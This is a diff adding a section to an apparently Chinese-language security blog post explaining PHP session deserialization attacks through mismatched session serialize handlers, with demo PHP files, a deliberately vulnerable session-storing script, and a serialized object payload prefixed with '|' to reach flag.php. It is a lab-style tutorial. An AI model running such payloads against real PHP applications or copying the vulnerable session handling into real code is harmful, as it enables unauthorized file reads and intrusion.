@@ -353,6 +353,29 @@
 
 <p>执行后可以看到</p>
 <p><img src="/2021/06/05/phpUnserialize/s3.png" alt="php_unseriablize3"></p>
+<p>命名方式为<code>sess_session_id()</code></p>
+<p>存储内容为序列化后的<code>session</code>:<code>test|s:4:&quot;test&quot;;</code></p>
+<p>不同处理器的格式不同，当不同页面使用了不同的处理器时，由于处理的<code>session</code>序列化格式不同，就可能产生反序列化漏洞</p>
+<p>因为<code>index.php</code>与<code>session.php</code>采用的序列化处理器不同，我们可以构造“误导”处理器，达到漏洞利用的目的</p>
+<p>也就是说将数据通过<code>session.php</code>序列化后将数据存入的文件与<code>index.php</code>反序列化获取反序列化值的文件相同</p>
+<p>从而达到反序列化攻击的目的</p>
+<p><code>index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	session_start();</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$user</span> = <span class="string">&#x27;test.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;__wakeup&lt;br/&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;filename;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>generate.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="keyword">new</span> A);</span><br></pre></td></tr></table></figure>
+
+<p><code>session.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	session_start();</span><br><span class="line"></span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;test&#x27;</span>] = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">	<span class="keyword">echo</span> session_id();</span><br></pre></td></tr></table></figure>
+
+<p>首先通过<code>generate.php</code>构造<code>payload</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将<code>O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</code>前面加一个<code>|</code></p>
+<p>即可将反序列化的值存入到<code>session</code>中使<code>index.php</code>反序列化</p>
+<p><img src="/2021/06/05/phpUnserialize/s4.png" alt="php_unseriablize4"></p>
+<p>即可完成<code>session反序列化</code>攻击</p>
+<p><img src="/2021/06/05/phpUnserialize/s5.png" alt="php_unseriablize5"></p>
 
       
     </div>
